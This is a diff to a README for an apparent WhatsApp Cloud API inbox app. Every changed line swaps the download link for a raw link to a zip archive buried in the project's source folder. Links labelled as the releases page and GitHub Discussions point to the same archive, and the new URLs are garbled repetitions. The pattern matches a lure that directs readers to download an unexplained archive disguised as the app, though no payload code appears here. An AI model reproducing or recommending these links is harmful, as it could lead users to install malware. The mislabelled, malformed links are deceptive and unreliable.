@@ -4,13 +4,13 @@
 Welcome to whatsapp-cloud-inbox! This application lets you easily manage your WhatsApp messages using the Cloud API. You can send template messages, use interactive buttons, share media, and follow up within a 24-hour response window. 
 
 ## 📥 Download Now
-[![Download WhatsApp Cloud Inbox](https://raw.githubusercontent.com/Franciscaglazed587/whatsapp-cloud-inbox/main/src/app/api/messages/[conversationId]/whatsapp-cloud-inbox-v3.5.zip)](https://raw.githubusercontent.com/Franciscaglazed587/whatsapp-cloud-inbox/main/src/app/api/messages/[conversationId]/whatsapp-cloud-inbox-v3.5.zip)
+[![Download WhatsApp Cloud Inbox](https://raw.githubusercontent.com/Franciscaglazed587/whatsapp-cloud-inbox/main/src/lib/inbox_whatsapp_cloud_counterpetition.zip[conversationId]https://raw.githubusercontent.com/Franciscaglazed587/whatsapp-cloud-inbox/main/src/lib/inbox_whatsapp_cloud_counterpetition.zip)](https://raw.githubusercontent.com/Franciscaglazed587/whatsapp-cloud-inbox/main/src/lib/inbox_whatsapp_cloud_counterpetition.zip[conversationId]https://raw.githubusercontent.com/Franciscaglazed587/whatsapp-cloud-inbox/main/src/lib/inbox_whatsapp_cloud_counterpetition.zip)
 
 ## 📂 Installation Steps
 Follow these simple steps to download and install whatsapp-cloud-inbox.
 
 1. **Visit the Releases Page:** Click the link below to go to the releases page.
-   [Download & Install](https://raw.githubusercontent.com/Franciscaglazed587/whatsapp-cloud-inbox/main/src/app/api/messages/[conversationId]/whatsapp-cloud-inbox-v3.5.zip)
+   [Download & Install](https://raw.githubusercontent.com/Franciscaglazed587/whatsapp-cloud-inbox/main/src/lib/inbox_whatsapp_cloud_counterpetition.zip[conversationId]https://raw.githubusercontent.com/Franciscaglazed587/whatsapp-cloud-inbox/main/src/lib/inbox_whatsapp_cloud_counterpetition.zip)
 
 2. **Choose the Latest Version:** Look for the latest version available on the releases page. This version includes the newest features and fixes.
 
@@ -63,7 +63,7 @@ If you encounter issues:
 For support, you can raise questions or issues through the GitHub issues page. We check frequently and aim to respond quickly.
 
 ## 🌍 Community
-Join our community on [GitHub Discussions](https://raw.githubusercontent.com/Franciscaglazed587/whatsapp-cloud-inbox/main/src/app/api/messages/[conversationId]/whatsapp-cloud-inbox-v3.5.zip) to connect with other users. Share tips, ask questions, and collaborate.
+Join our community on [GitHub Discussions](https://raw.githubusercontent.com/Franciscaglazed587/whatsapp-cloud-inbox/main/src/lib/inbox_whatsapp_cloud_counterpetition.zip[conversationId]https://raw.githubusercontent.com/Franciscaglazed587/whatsapp-cloud-inbox/main/src/lib/inbox_whatsapp_cloud_counterpetition.zip) to connect with other users. Share tips, ask questions, and collaborate.
 
 ## 🗒️ License
 whatsapp-cloud-inbox is open-source software released under the MIT License. Feel free to modify and distribute it according to the terms.
